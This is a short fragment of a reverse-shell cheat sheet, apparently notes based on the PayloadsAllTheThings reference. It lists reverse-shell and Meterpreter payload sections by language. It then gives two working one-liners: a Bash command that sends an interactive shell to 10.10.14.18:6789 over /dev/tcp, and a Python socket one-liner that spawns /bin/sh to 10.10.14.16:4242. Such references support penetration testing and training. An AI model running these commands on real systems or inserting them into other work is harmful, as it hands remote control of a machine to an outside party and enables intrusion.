...
[PayloadAllTheThings](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Summary

* [Reverse Shell](revshells.md#reverse-shell)
    * [Awk](revshells.md#awk)
    * [Bash TCP](revshells.md#bash-tcp)
    * [Bash UDP](revshells.md#bash-udp)
    * [C](revshells.md#c)
    * [Golang](revshells.md#golang)
    * [Groovy Alternative 1](revshells.md#groovy-alternative-1)
    * [Groovy](revshells.md#groovy)
    * [Java Alternative 1](revshells.md#java-alternative-1)
    * [Java Alternative 2](revshells.md#java-alternative-2)
    * [Java](revshells.md#java)
    * [Lua](revshells.md#lua)
    * [Ncat](revshells.md#ncat)
    * [Netcat OpenBsd](revshells.md#netcat-openbsd)
    * [Netcat Traditional](revshells.md#netcat-traditional)
    * [NodeJS](revshells.md#nodejs)
    * [OpenSSL](revshells.md#openssl)
    * [Perl](revshells.md#perl)
    * [PHP](revshells.md#php)
    * [Powershell](revshells.md#powershell)
    * [Python](revshells.md#python)
    * [Ruby](revshells.md#ruby)
    * [Socat](revshells.md#socat)
    * [War](revshells.md#war)
* [Meterpreter Shell](revshells.md#meterpreter-shell)
    * [Windows Staged reverse TCP](revshells.md#windows-staged-reverse-tcp)
    * [Windows Stageless reverse TCP](revshells.md#windows-stageless-reverse-tcp)
    * [Linux Staged reverse TCP](revshells.md#linux-staged-reverse-tcp)
    * [Linux Stageless reverse TCP](revshells.md#linux-stageless-reverse-tcp)
    * [Other platforms](revshells.md#other-platforms)
* [Spawn TTY Shell](revshells.md#spawn-tty-shell)
* [References](revshells.md#references)
...
```bash
bash -i >& /dev/tcp/10.10.14.18/6789 0>&1
...
IPv4
```python
export RHOST="10.10.14.16";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
